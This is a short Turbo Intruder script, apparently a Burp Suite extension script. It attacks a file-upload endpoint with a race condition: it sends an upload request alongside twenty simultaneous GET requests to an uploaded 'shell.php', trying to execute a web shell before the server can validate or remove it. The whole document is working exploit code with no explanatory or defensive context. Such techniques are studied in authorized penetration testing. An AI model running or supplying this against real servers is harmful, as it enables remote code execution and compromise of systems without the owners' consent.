def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    # Upload Request
    engine.queue(target.req, gate='race1')
    
    # Verify/execute the file immediately after
    for i in range(20):
        engine.queue(target.req, url='http://target.com/uploads/shell.php', method='GET', gate='race1')

    # Fire everything at once
    engine.openGate('race1')

def handleResponse(req, interesting):
    # Only show if the GET request
    if req.status == 200:
        table.add(req)
